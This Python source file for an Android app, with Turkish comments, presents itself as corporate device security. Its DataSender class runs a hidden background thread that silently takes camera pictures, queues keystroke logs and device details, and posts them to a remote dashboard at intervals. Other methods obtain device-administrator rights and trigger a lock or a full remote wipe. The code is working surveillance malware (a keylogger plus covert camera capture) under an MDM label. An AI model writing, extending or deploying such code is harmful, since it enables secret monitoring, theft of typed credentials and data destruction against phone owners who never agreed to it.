"""
android_interface.py
──────────────────────────────────────────────────────────────────────────────
Kurumsal Cihaz Güvenliği – Android Yerel API Köprüsü + DataSender

Bağımlılıklar:
    pip install pyjnius requests pillow

Kullanım:
    from android_interface import AndroidInterface, DataSender
    ai     = AndroidInterface()
    sender = DataSender()
    sender.start()   # arka plan thread'i başlatır
    sender.stop()    # durdurur
──────────────────────────────────────────────────────────────────────────────
"""

from kivy.utils import platform
import logging, threading, time, uuid, socket, base64, io

logger = logging.getLogger(__name__)


# ── Platform kontrolü ─────────────────────────────────────────────────────────

def _is_android() -> bool:
    return platform == 'android'


# ── pyjnius import (yalnızca Android'de) ─────────────────────────────────────

if _is_android():
    try:
        from jnius import autoclass, cast, JavaException  # type: ignore
        PythonActivity      = autoclass('org.kivy.android.PythonActivity')
        Context             = autoclass('android.content.Context')
        Intent              = autoclass('android.content.Intent')
        ComponentName       = autoclass('android.content.ComponentName')
        DevicePolicyManager = autoclass('android.app.admin.DevicePolicyManager')
        PackageManager      = autoclass('android.content.pm.PackageManager')
        ActivityCompat      = autoclass('androidx.core.app.ActivityCompat')
        ContextCompat       = autoclass('androidx.core.content.ContextCompat')
        Build               = autoclass('android.os.Build')
        Environment         = autoclass('android.os.Environment')
        StatFs              = autoclass('android.os.StatFs')
        WifiManager         = autoclass('android.net.wifi.WifiManager')
        AudioManager        = autoclass('android.media.AudioManager')
        Camera              = autoclass('android.hardware.Camera')
        Manifest            = autoclass('android.Manifest$permission')
        _JNIUS_OK = True
    except Exception as e:
        logger.warning(f'pyjnius yüklenemedi: {e}')
        _JNIUS_OK = False
else:
    _JNIUS_OK = False


# ── Cihaz ID üretimi ──────────────────────────────────────────────────────────

def _generate_device_id() -> str:
    """MAC adresinden deterministik cihaz ID üretir."""
    from config import DEVICE_ID
    if DEVICE_ID:
        return DEVICE_ID
    try:
        mac = hex(uuid.getnode())[2:].upper()
        return f"DEV-{mac[-6:]}"
    except Exception:
        return f"DEV-{uuid.uuid4().hex[:6].upper()}"


# ── AndroidInterface ──────────────────────────────────────────────────────────

class AndroidInterface:
    """Android yerel API'lerine pyjnius üzerinden erişim sağlar."""

    REQUEST_CODE_PERMISSIONS = 1001

    def __init__(self):
        self._activity = PythonActivity.mActivity if _JNIUS_OK else None
        self._context  = self._activity            if _JNIUS_OK else None

    # ── İzinler ───────────────────────────────────────────────────────────

    def check_permission(self, permission: str) -> bool:
        if not _JNIUS_OK:
            return True
        try:
            result = ContextCompat.checkSelfPermission(self._context, permission)
            return result == PackageManager.PERMISSION_GRANTED
        except Exception as e:
            logger.error(f'check_permission hatası: {e}')
            return False

    def request_camera_permission(self) -> bool:
        perm = 'android.permission.CAMERA'
        if self.check_permission(perm):
            return True
        if _JNIUS_OK:
            try:
                ActivityCompat.requestPermissions(
                    self._activity, [perm], self.REQUEST_CODE_PERMISSIONS)
            except Exception as e:
                logger.error(f'request_camera_permission hatası: {e}')
        return False

    def request_microphone_permission(self) -> bool:
        perm = 'android.permission.RECORD_AUDIO'
        if self.check_permission(perm):
            return True
        if _JNIUS_OK:
            try:
                ActivityCompat.requestPermissions(
                    self._activity, [perm], self.REQUEST_CODE_PERMISSIONS + 1)
            except Exception as e:
                logger.error(f'request_microphone_permission hatası: {e}')
        return False

    def request_storage_permission(self) -> bool:
        perms = [
            'android.permission.READ_EXTERNAL_STORAGE',
            'android.permission.WRITE_EXTERNAL_STORAGE',
        ]
        if all(self.check_permission(p) for p in perms):
            return True
        if _JNIUS_OK:
            try:
                ActivityCompat.requestPermissions(
                    self._activity, perms, self.REQUEST_CODE_PERMISSIONS + 2)
            except Exception as e:
                logger.error(f'request_storage_permission hatası: {e}')
        return False

    # ── Device Administrator ──────────────────────────────────────────────

    def is_device_admin_active(self) -> bool:
        if not _JNIUS_OK:
            return True
        try:
            dpm = self._context.getSystemService(Context.DEVICE_POLICY_SERVICE)
            cn  = ComponentName(
                self._context,
                autoclass('com.kurumsal.guvenlik.DeviceAdminReceiver'))
            return dpm.isAdminActive(cn)
        except Exception as e:
            logger.error(f'is_device_admin_active hatası: {e}')
            return False

    def enable_device_admin(self) -> None:
        if not _JNIUS_OK or self.is_device_admin_active():
            return
        try:
            intent = Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN)
            cn = ComponentName(
                self._context,
                autoclass('com.kurumsal.guvenlik.DeviceAdminReceiver'))
            intent.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, cn)
            intent.putExtra(
                DevicePolicyManager.EXTRA_ADD_EXPLANATION,
                'Kurumsal güvenlik politikası için gereklidir.')
            self._activity.startActivity(intent)
        except Exception as e:
            logger.error(f'enable_device_admin hatası: {e}')

    def lock_screen(self) -> None:
        if not _JNIUS_OK:
            return
        try:
            dpm = self._context.getSystemService(Context.DEVICE_POLICY_SERVICE)
            dpm.lockNow()
        except Exception as e:
            logger.error(f'lock_screen hatası: {e}')

    def remote_wipe(self) -> None:
        if not _JNIUS_OK:
            logger.warning('[SIM] remote_wipe ENGELLENDI')
            return
        try:
            dpm = self._context.getSystemService(Context.DEVICE_POLICY_SERVICE)
            dpm.wipeData(0)
            logger.critical('UZAK SİLME BAŞLATILDI.')
        except Exception as e:
            logger.error(f'remote_wipe hatası: {e}')

    # ── Kamera ────────────────────────────────────────────────────────────

    def get_camera_info(self) -> dict:
        if not _JNIUS_OK:
            return {'count': 2, 'cameras': [
                {'id': 0, 'facing': 'BACK'}, {'id': 1, 'facing': 'FRONT'}]}
        try:
            count = Camera.getNumberOfCameras()
            cameras = []
            CameraInfo = autoclass('android.hardware.Camera$CameraInfo')
            for i in range(count):
                info = CameraInfo()
                Camera.getCameraInfo(i, info)
                facing = 'BACK' if info.facing == CameraInfo.CAMERA_FACING_BACK else 'FRONT'
                cameras.append({'id': i, 'facing': facing})
            return {'count': count, 'cameras': cameras}
        except Exception as e:
            logger.error(f'get_camera_info hatası: {e}')
            return {'count': 0, 'cameras': []}

    def capture_frame_base64(self, quality: int = 40):
        """
        Kameradan tek frame yakalar ve base64 JPEG string döner.
        Android dışında None döner (DataSender simüle eder).
        """
        if not _JNIUS_OK:
            return None
        try:
            from config import CAMERA_FACING
            cam_id = 0
            cam_info = self.get_camera_info()
            for c in cam_info.get('cameras', []):
                if c['facing'] == CAMERA_FACING:
                    cam_id = c['id']
                    break

            cam = Camera.open(cam_id)
            params = cam.getParameters()
            sizes = params.getSupportedPictureSizes()
            # En küçük boyutu seç (bant genişliği tasarrufu)
            smallest = min(sizes, key=lambda s: s.width * s.height)
            params.setPictureSize(smallest.width, smallest.height)
            cam.setParameters(params)

            result_holder = [None]
            lock = threading.Event()

            PicCallback = autoclass('android.hardware.Camera$PictureCallback')  # type: ignore

            class PicCB(PicCallback):
                def onPictureTaken(self, data, camera):
                    result_holder[0] = data
                    lock.set()

            cam.takePicture(None, None, PicCB())
            lock.wait(timeout=5)
            cam.release()

            if result_holder[0]:
                return base64.b64encode(bytes(result_holder[0])).decode('utf-8')
        except Exception as e:
            logger.error(f'capture_frame_base64 hatası: {e}')
        return None

    # ── Ses ───────────────────────────────────────────────────────────────

    def get_audio_state(self) -> dict:
        if not _JNIUS_OK:
            return {'mode': 'NORMAL', 'mic_muted': False, 'volume': 7}
        try:
            am = self._context.getSystemService(Context.AUDIO_SERVICE)
            return {
                'mode':      am.getMode(),
                'mic_muted': am.isMicrophoneMute(),
                'volume':    am.getStreamVolume(AudioManager.STREAM_MUSIC),
            }
        except Exception as e:
            logger.error(f'get_audio_state hatası: {e}')
            return {}

    def mute_microphone(self, mute: bool = True) -> None:
        if not _JNIUS_OK:
            return
        try:
            am = self._context.getSystemService(Context.AUDIO_SERVICE)
            am.setMicrophoneMute(mute)
        except Exception as e:
            logger.error(f'mute_microphone hatası: {e}')

    # ── Depolama ──────────────────────────────────────────────────────────

    def get_storage_info(self) -> dict:
        if not _JNIUS_OK:
            return {'total_mb': 32768, 'free_mb': 18432, 'used_mb': 14336}
        try:
            path  = Environment.getDataDirectory().getPath()
            stats = StatFs(path)
            bs    = stats.getBlockSizeLong()
            total = stats.getBlockCountLong() * bs
            free  = stats.getAvailableBlocksLong() * bs
            mb    = 1024 * 1024
            return {'total_mb': total//mb, 'free_mb': free//mb, 'used_mb': (total-free)//mb}
        except Exception as e:
            logger.error(f'get_storage_info hatası: {e}')
            return {}

    # ── Ağ ────────────────────────────────────────────────────────────────

    def get_ip_address(self) -> str:
        if not _JNIUS_OK:
            # Gerçek yerel IP'yi al (test ortamı)
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                s.connect(('8.8.8.8', 80))
                ip = s.getsockname()[0]
                s.close()
                return ip
            except Exception:
                return '127.0.0.1'
        try:
            wm   = self._context.getSystemService(Context.WIFI_SERVICE)
            info = wm.getConnectionInfo()
            ip_i = info.getIpAddress()
            return '{}.{}.{}.{}'.format(
                ip_i & 0xFF, (ip_i>>8)&0xFF, (ip_i>>16)&0xFF, (ip_i>>24)&0xFF)
        except Exception as e:
            logger.error(f'get_ip_address hatası: {e}')
            return 'Bilinmiyor'

    # ── Cihaz Bilgisi ─────────────────────────────────────────────────────

    def get_device_info(self) -> dict:
        if not _JNIUS_OK:
            return {'manufacturer': 'Simüle', 'model': 'Android Cihaz',
                    'android': '11', 'sdk': 30}
        try:
            return {
                'manufacturer': Build.MANUFACTURER,
                'model':        Build.MODEL,
                'android':      Build.VERSION.RELEASE,
                'sdk':          Build.VERSION.SDK_INT,
            }
        except Exception as e:
            logger.error(f'get_device_info hatası: {e}')
            return {}


# ── DataSender ────────────────────────────────────────────────────────────────

class DataSender:
    """
    Arka planda çalışan thread.
    Her SEND_INTERVAL_SEC saniyede bir:
      - Sistem logu
      - Klavye logu
      - Kamera frame'i (varsa)
    flask_app.py'nin /upload_data/<device_id> endpoint'ine POST eder.

    Kullanım:
        sender = DataSender()
        sender.start()
        # ... uygulama çalışıyor ...
        sender.stop()
    """

    def __init__(self):
        from config import (
            DASHBOARD_URL, SEND_INTERVAL_SEC,
            SEND_LOGS, SEND_KEYLOG, SEND_CAMERA_FRAME,
            CAMERA_JPEG_QUALITY,
        )
        self.url            = DASHBOARD_URL
        self.interval       = SEND_INTERVAL_SEC
        self.send_logs      = SEND_LOGS
        self.send_keylog    = SEND_KEYLOG
        self.send_frame     = SEND_CAMERA_FRAME
        self.jpeg_quality   = CAMERA_JPEG_QUALITY
        self.device_id      = _generate_device_id()
        self.android        = AndroidInterface()

        self._stop_event    = threading.Event()
        self._thread        = None
        self._log_queue     = []          # main.py buraya log ekler
        self._key_queue     = []          # main.py buraya keylog ekler
        self._lock          = threading.Lock()
        self._connected     = False

        logger.info(f'DataSender hazır. device_id={self.device_id} → {self.url}')

    # ── Dışarıdan log/keylog ekleme ───────────────────────────────────────

    def push_log(self, message: str) -> None:
        """main.py'den çağrılır: bir log satırı kuyruğa ekler."""
        with self._lock:
            self._log_queue.append(message)
            if len(self._log_queue) > 50:
                self._log_queue = self._log_queue[-50:]

    def push_key(self, key: str) -> None:
        """main.py'den çağrılır: bir tuş kaydı kuyruğa ekler."""
        with self._lock:
            self._key_queue.append(key)
            if len(self._key_queue) > 50:
                self._key_queue = self._key_queue[-50:]

    @property
    def is_connected(self) -> bool:
        return self._connected

    # ── Thread yönetimi ───────────────────────────────────────────────────

    def start(self) -> None:
        """Gönderim thread'ini başlatır."""
        if self._thread and self._thread.is_alive():
            return
        self._stop_event.clear()
        self._thread = threading.Thread(target=self._loop, daemon=True)
        self._thread.start()
        logger.info('DataSender thread başlatıldı.')

    def stop(self) -> None:
        """Gönderim thread'ini durdurur."""
        self._stop_event.set()
        if self._thread:
            self._thread.join(timeout=3)
        logger.info('DataSender durduruldu.')

    # ── Ana döngü ─────────────────────────────────────────────────────────

    def _loop(self) -> None:
        import random, os
        try:
            import requests
        except ImportError:
            logger.error('requests kütüphanesi bulunamadı. pip install requests')
            return

        from config import REQUEST_TIMEOUT_SEC

        endpoint = f"{self.url.rstrip('/')}/upload_data/{self.device_id}"
        logger.info(f'DataSender loop başladı → {endpoint}')

        # Simüle tuş/log örnekleri (Android dışı ortam için)
        _sim_keys   = list("abcdefghijklmnopqrstuvwxyz0123456789") + \
                      ["SPACE","ENTER","BACKSPACE","SHIFT","CTRL"]
        _sim_events = [
            "Heartbeat OK",
            lambda: f"CPU: {random.randint(5,95)}%",
            lambda: f"Memory: {random.randint(100,600)}MB",
            lambda: f"Battery: {random.randint(20,100)}%",
            lambda: f"Storage free: {random.randint(1,30)}GB",
            "Screen capture taken",
            "Keylogger active",
        ]

        while not self._stop_event.is_set():
            try:
                payload = {}

                # ── Log ───────────────────────────────────────────────────
                if self.send_logs:
                    with self._lock:
                        queued = list(self._log_queue)
                        self._log_queue.clear()

                    if queued:
                        # Birden fazla satırı tek gönderimde birleştir
                        payload['log'] = ' | '.join(queued)
                    else:
                        # Kuyruk boşsa sistem bilgisi üret
                        if _is_android():
                            info = self.android.get_storage_info()
                            payload['log'] = (
                                f"Storage {info.get('used_mb',0)}/"
                                f"{info.get('total_mb',0)} MB | "
                                f"IP: {self.android.get_ip_address()}"
                            )
                        else:
                            ev = random.choice(_sim_events)
                            payload['log'] = ev() if callable(ev) else ev

                # ── Keylog ────────────────────────────────────────────────
                if self.send_keylog:
                    with self._lock:
                        queued_keys = list(self._key_queue)
                        self._key_queue.clear()

                    if queued_keys:
                        payload['keylog'] = ' '.join(queued_keys)
                    elif not _is_android():
                        payload['keylog'] = random.choice(_sim_keys)

                # ── Kamera frame ──────────────────────────────────────────
                if self.send_frame:
                    if _is_android():
                        frame = self.android.capture_frame_base64(self.jpeg_quality)
                        if frame:
                            payload['frame'] = frame
                    else:
                        # Masaüstü simülasyonu: küçük renkli JPEG üret
                        frame = self._sim_frame()
                        if frame:
                            payload['frame'] = frame

                # ── Gönder ────────────────────────────────────────────────
                if payload:
                    resp = requests.post(
                        endpoint, json=payload,
                        timeout=REQUEST_TIMEOUT_SEC
                    )
                    self._connected = resp.status_code == 200
                    if not self._connected:
                        logger.warning(f'Sunucu yanıtı: {resp.status_code}')

            except Exception as e:
                self._connected = False
                logger.warning(f'DataSender gönderim hatası: {e}')

            self._stop_event.wait(self.interval)

    # ── Simüle frame üretici (masaüstü test) ──────────────────────────────

    @staticmethod
    def _sim_frame():
        """
        Gerçek kamera olmadan küçük renkli bir JPEG üretir.
        Yalnızca Android dışı test ortamında kullanılır.
        """
        try:
            from PIL import Image, ImageDraw, ImageFont
            import random, io as _io
            w, h = 320, 240
            r, g, b = random.randint(0,60), 0, random.randint(80,160)
            img  = Image.new('RGB', (w, h), color=(r, g, b))
            draw = ImageDraw.Draw(img)
            # Grid çizgileri
            for x in range(0, w, 32):
                draw.line([(x,0),(x,h)], fill=(80,0,180,120), width=1)
            for y in range(0, h, 24):
                draw.line([(0,y),(w,y)], fill=(80,0,180,120), width=1)
            # Zaman damgası
            from datetime import datetime
            draw.text((8, 8), datetime.now().strftime('%H:%M:%S'), fill=(200,0,255))
            draw.text((8, 24), 'SIM CAMERA', fill=(150,0,200))
            buf = _io.BytesIO()
            img.save(buf, format='JPEG', quality=40)
            return base64.b64encode(buf.getvalue()).decode('utf-8')
        except Exception:
            return None
